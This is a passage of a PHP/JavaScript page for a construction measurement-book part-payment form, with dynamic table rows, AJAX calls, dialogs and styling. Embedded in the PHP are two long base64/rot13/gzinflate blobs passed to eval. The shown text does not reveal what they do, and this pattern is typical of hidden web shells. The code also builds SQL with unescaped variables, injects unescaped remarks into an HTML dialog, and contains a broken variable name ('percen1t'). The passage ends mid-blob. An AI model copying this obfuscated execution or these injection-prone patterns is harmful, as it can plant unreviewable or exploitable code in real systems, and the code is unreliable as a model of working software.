							cell5.setAttribute('class', "dynamicrowcell");	
							cell5.style.padding = "0px 0px 0px 0px";
						var txt_box5 = document.createElement("input");
							txt_box5.name = "txt_partpay_amt_dpm";
							txt_box5.id = "txt_partpay_amt_dpm"+index;
							txt_box5.value = Number(amount).toFixed(2);
							txt_box5.style.width = 110+"px";
							txt_box5.style.textAlign = "right";
							txt_box5.style.pointerEvents = "none";
							txt_box5.setAttribute('class', "dynamictextbox"); 
							cell5.appendChild(txt_box5);
							
						var cell6=row.insertCell(5);
							cell6.setAttribute('class', "dynamicrowcell");	
							cell6.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box6 = document.createElement("input");
								txt_box6.name = "txt_percent_dpm_payable";
								txt_box6.id = "txt_percent_dpm_payable1"+index;
								txt_box6.value = Number(PayableDpmSlmPercent);
								txt_box6.style.width = 35+"px";
								txt_box6.style.border = "1px solid #2aade4";
								txt_box6.style.backgroundColor = "#ffffff";
								txt_box6.style.textAlign = "right";
								txt_box6.setAttribute('class', "dynamictextbox");
								txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index); 
								cell6.appendChild(txt_box6);
						}
						else
						{
							cell6.innerHTML = "";
						}
							
						var cell7=row.insertCell(6);
							cell7.setAttribute('class', "dynamicrowcell");	
							cell7.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box7 = document.createElement("input");
								txt_box7.name = "txt_amt_dpm_payable1[]";
								txt_box7.id = "txt_amt_dpm_payable"+index;
								txt_box7.value = Number(PayAbleSlmDpmAmt).toFixed(2);
								txt_box7.style.width = 110+"px";
								txt_box7.style.textAlign = "right";
								txt_box7.style.pointerEvents = "none";
								txt_box7.setAttribute('class', "dynamictextbox"); 
								cell7.appendChild(txt_box7);
						}
						else
						{
							cell7.innerHTML = "";
						}
						
						var txt_box8 = document.createElement("input");
							txt_box8.type = "hidden";
							txt_box8.id = "hid_dpm_result"+index;
							txt_box8.name = "hid_dpm_result[]";
							txt_box8.value = result;
							txt_box8.setAttribute('class', "dynamictextbox");
							txt_box8.style.width = 70+"px";
							txt_box8.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box8);
							
						var txt_box9 = document.createElement("input");
							txt_box9.type = "hidden";
							txt_box9.id = "hid_dpm_mbid"+index;
							txt_box9.name = "hid_dpm_mbid";
							txt_box9.value = mbookid;
							txt_box9.setAttribute('class', "dynamictextbox");
							txt_box9.style.width = 70+"px";
							txt_box9.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box9);
						index++;	
					}
					document.getElementById("txt_partpay_total_paidamt_dpm").value = Number(TotalPaidDpmAmount).toFixed(2);
					document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(TotalPayableDpmAmount).toFixed(2);
				}
				
			}
		}
		xmlHttp.send(strURL);	
	}
	
	function getSLMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp; 
		var data;
		var i, rbn, qty, percent, newrow = "", amt;
		var slmitemQty = document.getElementById("hid_slm_qty").value;
		if(Number(slmitemQty) == 0)
		{
			document.getElementById("rowid0").className = "hide";
			document.getElementById("slmheadrow").className = "hide";
			document.getElementById("slmtotalrow").className = "hide";
			document.getElementById("slmremarksrow").className = "hide";
		}
		else
		{
			document.getElementById("rowid0").className = "";
			document.getElementById("slmheadrow").className = "";
			document.getElementById("slmtotalrow").className = "";
			document.getElementById("slmremarksrow").className = "";
		}
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_slm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText; 
				if(data != "")
				{
					
					var x = Number(document.getElementById("table4").rows.length);
					var index = x;
					var Splitdata = data.split("@@");
					var SlmRemarks = Splitdata[1];
					var SlmDetails = Splitdata[0];
					var details = SlmDetails.split("*");
					for(i=0; i<details.length; i+=3)
					{
						//var arr = index;
						var arg = "X"+"*"+index;
							rbn 	= details[i];
							qty 	= details[i+1];
							percent = details[i+2];
							var result = percent+"*"+rbn+"*"+qty+"*"+itemid;
							amt 	= Number(qty)*Number(rate)*Number(percent)/100;
						var table=document.getElementById("table4");
						var row=table.insertRow(table.rows.length-2);
							row.id = "rowid"+index;
							row.style.align = "center";
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "dynamicrowcell");
							cell1.style.padding = "0px 0px 0px 0px";
								
						var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_partpay_qty_slm1[]";
							txt_box1.id = "txt_partpay_qty_slm"+index;
							txt_box1.value = Number(qty);
							txt_box1.style.width = 93+"px";
							txt_box1.style.border = "1px solid #2aade4";
							txt_box1.style.textAlign = "right";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm");
												};
											})(index);
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_item_rate_slm1";
							txt_box2.id = "txt_item_rate_slm1"+index;
							txt_box2.value = Number(rate).toFixed(2);
							txt_box2.style.textAlign = "right";
							txt_box2.style.width = 80+"px";
							//txt_box2.readOnly = true;
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm");
												};
											})(index);
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_partpay_percent_slm1";
							txt_box3.id = "txt_partpay_percent_slm1"+index;
							txt_box3.value = percen1t;
							txt_box3.style.width = 40+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.border = "1px solid #2aade4";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							txt_box3.onblur= (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm");
												ValidatePercent(this,"slm",ind);
												};
											})(index);
											
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_amt_slm1[]";
							txt_box4.id = "txt_partpay_amt_slm"+index;
							txt_box4.value = Number(amt).toFixed(2);
							txt_box4.style.width = 130+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						
						if(i == 0)
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var addbtn=document.createElement("input");
								addbtn.type = "button";
								addbtn.value = " + ";
								addbtn.id = "btn_add_row_slm1"+index;
								addbtn.name = "btn_add_row_slm";
								addbtn.setAttribute('class', "delbtnstyle");
								addbtn.style.width = 32+"px";
								addbtn.style.borderRadius = 0+"px";
								addbtn.onclick = function () {
												  addRow()
												}
								cell5.appendChild(addbtn);
						
						
						}
						else
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var delbtn=document.createElement("input");
								delbtn.type = "button";
								delbtn.value = " X ";
								delbtn.id = "btn_delete"+index;
								delbtn.name = "btn_delete";
								delbtn.setAttribute('class', "delbtnstyle");
								delbtn.style.width = 32+"px";
								delbtn.style.borderRadius = 0+"px";
								delbtn.onclick = (function (ind) {
												  //deleteRow(row.id)
												  	return function() {
													deleteRow(this);
													};
												})(index);
								cell5.appendChild(delbtn);
						}	
						
							//var cell6=row.insertCell(5);
							//cell5.style.width = 10+"px";
							//cell6.style.textAlign = "center";
							//cell6.style.padding = "0px 0px 0px 0px";
							//cell6style.visibility = "hidden";	
							
					// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
						var txt_box5 = document.createElement("input");
							txt_box5.type = "hidden";
							txt_box5.id = "hid_slm_result"+index;
							txt_box5.name = "hid_slm_result1[]";
							txt_box5.value = result;
							txt_box5.setAttribute('class', "dynamictextbox");
							txt_box5.style.width = 70+"px";
							txt_box5.style.borderRadius = 0+"px";
							cell5.appendChild(txt_box5);
							index++;
						var elmt = document.getElementById("rowid0");
							elmt.style.display = "none";
							totalAmountCalculation("slm");
						//index++;
							result = "";
					}
					if(SlmRemarks != "")
					{
						document.getElementById("txt_slm_remarks").value = SlmRemarks;
					}
					else
					{
						document.getElementById("txt_slm_remarks").value = "";
					}
				}totalAmountCalculation("slm");
					//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);

			}
		}
		xmlHttp.send(strURL);	
	}
	
	function saveDataDetails()
	{
		var result1 = "X";
		$('input[name="hid_slm_result[]"]').each(function() {
			var res1 = $(this).val();
			if(res1 != "")
			{
				result1 = res1 + "@"+ result1;
			}
		});
		
		var result2 = "Y";
		$('input[name="hid_dpm_result[]"]').each(function() {
			var res2 = $(this).val();
			result2 = res2 + "@"+ result2;
		});
		//alert(result1)
		//alert(result2)
		var result = result1 + "###" + result2;
		//alert(result);
		var itemid = document.getElementById("txt_item_id").value;
		var itemStr = document.getElementById("hid_item_str").value;
		var SlmRemarks = document.getElementById("txt_slm_remarks").value;
		var DpmRemarks = document.getElementById("txt_dpm_remarks").value;
		var RemarksStr = SlmRemarks + "@*@" + DpmRemarks;
		//alert(result);
		var sheetid = document.getElementById("txt_sheet_id").value;
		$.post("Partpayment_Update.php", {resultdata: result, sheetid: sheetid, itemStr: itemStr, RemarksStr: RemarksStr}, function (data) {
		//alert(data);
			if(data == 1)
			{
				
				//swal("", "Sucessfully Updated...!", "success");
				location.reload();
				//$.modal.close();
				
			}
        });
		

	}
	
	function ShowRemarks(id)
	{
		var idcount = id;
		var RemarksData = document.getElementById("hid_dpm_remarkdata"+idcount).value;
		swal({
		title: "<small>Deduct Previous Measurement Remarks</small>",
		text: "<small>"+RemarksData+"</small>",
		html: true
	});
	}
	
	function SaveData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to update this data..?!",   
			//type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Update!",   
			cancelButtonText: "No, Cancel!",   
			closeOnConfirm: false,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{     
				saveDataDetails();  
			} 
			else 
			{     
				swal("Cancelled", "Your data not updated:)", "error");   
			} 
		});
	}
	function CancelData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to Cancel this operation..?!",   
			//type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Cancel!",   
			cancelButtonText: "No, Stay on this!",   
			closeOnConfirm: true,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{   
				  
				$.modal.close();  
			} 
			else 
			{     
				swal({   
				title: "Please Wait!",   
				text: "Your Page will be redirected..",   
				timer: 2000,   showConfirmButton: false 
				});
			} 
		});
	}
</script>
<style>
.pagetitle
{
	text-shadow:
    -1px -1px 0 #7F7F7F,
    1px -1px 0 #7F7F7F,
    -1px 1px 0 #7F7F7F,
    1px 1px 0 #7F7F7F; 
}
.table1
{
	color:#BF0602;
	/*color:#921601;*/
	border: 1px solid #959595;
	border-collapse: collapse;
}
.table1 td
{ 
	border: 1px solid #959595;
	border-collapse: collapse;
}
.fontcolor1
{
	color:#FFFFFF;
}

.popuptitle
{
	background-color:#0080FF;
	font-weight:bold;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:14px;
	color:#FFFFFF;
	line-height:25px;
	border:1px solid #9b9da0;
}
.table2
{
	color:#071A98;
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.table2 td
{
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.bottomsection
{
 	position: absolute;
    bottom: 0;
	width:100%;
	line-height:38px;
}
.buttonsection
{
	display: inline-block;
	line-height:38px;
}
.buttonstyle
{
	background-color:#0080FF;
	width:80px;
	height:25px;
	color:#FFFFFF;
	-moz-box-shadow: 0px 1px 0px 0px #0080FF;
	-webkit-box-shadow: 0px 1px 0px 0px #0080FF;
	box-shadow: 0px 1px 0px 0px #0080FF;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #0080FF), color-stop(1, #0080FF));
	background:-moz-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-webkit-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-o-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-ms-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:linear-gradient(to bottom, #0080FF 5%, #0080FF 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0080FF', endColorstr='#0080FF',GradientType=0);
	border:1px solid #0080FF;
	display:inline-block;
	cursor:pointer;
	font-weight:bold;

}
.buttonstyle:hover
{
	font-size:14px;
	padding: 0.1em 1em;
	-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    -webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    box-shadow:0px 1px 4px rgba(0,0,0,5);
	background:#E80017;
	border:1px solid #E80017;
}
.popuptextbox
{
	border:none;
	font-family:Verdana;
	font-size:12px;
	font-weight:bold;
	color:#DE0117;
	text-align:center;
	pointer-events: none;
}
.dynamictextbox
{
	border:1px solid #ffffff;
	height:21px;
	color:#DE0117;
	font-weight:bold;
}
.dynamictextbox:hover, .dynamictextbox:focus
{
	/*outline: none;*/
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;
    /*border-color: #9ecaed;
    box-shadow: 0 0 10px #9ecaed;*/
}
.dynamictextbox2
{
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;	
}
.dynamicrowcell
{
	padding-bottom:0px;
	padding-top:0px; 
	padding-left:0px; 
	padding-right:0px;
	text-align:right;
	font:Verdana, Arial, Helvetica, sans-serif;
}
.hide
{
	display:none;
}
.labelprint
{
	font-weight:normal;
	color:#000000;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:10pt;
}
@media print 
{
	.printbutton
	{
		display: none !important;
	}
}
/*.table1 tr:nth-child(even) {background: #CCC}
.table1 tr:nth-child(odd) {background: #FFF}*/
</style>		
<body bgcolor="" onload="setRowSpan();noBack();" onpageshow="if (event.persisted) noBack();" onUnload="" style="padding:0; margin:0;">
<!--<table width="1087px" height="56px" align="center" class='label' bgcolor="#0A9CC5">
	<tr bgcolor="#0A9CC5" style="position:fixed;">
		<td style="color:#FFFFFF; border:none; font-size:16px;" width="1077px"  height="48px" class="pagetitle" align="center">ABSTRACT MEASUREMENT BOOK - PART PAYMENT</td>
	</tr>
</table>-->
<form name="form" method="post" onsubmit="return confirm('Do you really want to submit the Book?');">
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

?>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor="#FFFFFF" id="table1">
<?php echo $tablehead; ?>
<!--<tr bgcolor="#d4d8d8" style="height:5px"><td colspan="13" style="border-top-color:#666666; border-bottom-color:#666666;height:5px"></td></tr>-->
<?php 
//$Line = $Line+2;
$color_var = 0; $table_group_row = 0; $temp_array = array(); $OverAllDpmAmount = 0; $OverAllSlmDpmAmount = 0; $OverAllSlmDpmAmount = 0; $SubdividDpmStr = "";
$unionqur = "(SELECT subdivid  FROM mbookgenerate WHERE sheetid = '$abstsheetid') UNION (SELECT subdivid  FROM measurementbook WHERE sheetid = '$abstsheetid' AND (part_pay_flag = '0' OR part_pay_flag = '1'))";
$unionsql = mysql_query($unionqur);
while($Listsubdivid = mysql_fetch_array($unionsql)) { $subdivid_list .= $Listsubdivid['subdivid']."*"; }
$subdivisionlist_1 = explode("*",rtrim($subdivid_list,"*"));
natsort($subdivisionlist_1);
foreach($subdivisionlist_1 as $key => $summ_1)
{
   if($summ_1 != "")
   {
      $subdivisionlist_2 .= $summ_1.",";
   }
}
$subdivisionlist = explode(',',rtrim($subdivisionlist_2,","));
for($i=0;$i<count($subdivisionlist);$i++)
{
	eval(str_rot13(gzinflate(str_rot13(base64_decode('LUzVkoVZkn6aiZm9wyX2CmpqYTZjaj08/UD/29HdBykKyMr8JM/ajL//7MOZeb+xTf8zjeWKIf+3rGa6rP8pxrYufv+/82JSW247YnH9Fv8FOd37p7E3UiP3et1W6Gi3x9AbA1/V/S/IqKjQGLRnBYmeqd+hN35F/Nq+W7hCaxNQ4O9zpB2wQ3O9tIHv3moOy8mZLuJqAmEN0W2Bw6yf3Bs6jDYemWFj307sw+E3QeYCgwKJ2W1tkrL+e8X7i7ima75QEpylZS+KjtTvryjrTj41AhusJ7hbyXJXz2jz5oFYh6IKiW8zR3BqVTcwWz/SEZOuhkNSaM/kL81/hH0no+AwZCIzABUexx6r6Yrcme4B+DOkWgZC6pvnY7NHk9qHhqX3jQWKaFu6R1uGKG1VI9y0AwRG0OVxAGS6E0yR7nRq4aQvETfAAj/2WLJ004q8Hmp9NidjQj1d30rhSu57s7SlV8LFTu/QoawqQUSW3Za4iGkTM0cj6GpVN8ZG9MbesRs2ztrbni1CYbn3jAZ1CL44kVLWfh24e723v+sLF8jfENALpnt3pikEnku+VFiGJeE6fSeiDNxa2CP2LSbUGpX/iTFeKQHs/4p+KHhYpsotS4aAOAbVOjgXG8KTpZLH2gn2Z6/W/nIJbK1KAuE7SXwLE4pX2t+136ZKLa2VL0T1AtEJ1gnsDbSNpV9jr3DH2rqA348PKGT5e0iOCO9myTPlyjA7ZA0TEVMR5ApiO7FP5ktAU2HJYS5ze9T4ji8R0eRn/NIeovefaKgxC3AlLnbkzMtGjwCPqxSZ21YHE1tAyLgJ/y7RKWJMCqnaNhuwFuHHdstUK0xDU041QTjZVVv9qeZ78Jh+fKODhn44/CS3X8jPK/bFZvA6Wwtcjc0Ktd7fw4Icl8Z7BJnfHW39vWKRoN+C7HID9/VJ+ruMLnnqkmQ2wD+ZOyot27dMH2+ngtnkY1W2dB4iUSm6p1iSTuKOdyski+mrC9fRxiALIDl+oqte0p+nL6Qj6ASE7trbHcC9RonBATPNrjrlq+zTFQXT2Fe+XZLodIfvo/Byiz1iZIRPYWcabtsC8T04vitu8p4mxDhzzFXe/YAfYk23VgdKY7fP1Oo9W+vqXaZf8b7plr0fgS47nEQgyWdmCipal7gjqUOWHC3uEjGfEi91Po4pAzJZkUpNdo2noNkcFP+Ay3ZfKiPKYqwM2yStdpbUwEUCTv0Fg+gOwsjNjHNc4TbYFF19iWQNYFataZi6QFwi72i4cFsGjXXx8u5AGD1UIQXu80DkXJ7GurtADdFRvj0bs9Oi7LqnveYYIlqeTnhpISgc72ihNrxmI46qu0sZoQ+2YYlT5l5eTPKlh8vkbgtoEdE7yLcosG6r9VJQ4wnw2P2CdEhn6EGifHS+GEgpGU+4EITTnIowxrtQny7Byl6nCRYo2Pmo/Egab5X9mDCjOJuTAOqgavb5Ap8YPCx0S+1qHzfifKeV7dak5nQJrrEz70QLXykfvD4l+cHnRIlUlkvwu61je48WJb/nIU1HWtLlhwfBjP3DfPWetzagSWRZ/eqUARLpHH/3PVAzisd83yRPFQHilj42mC9bBQ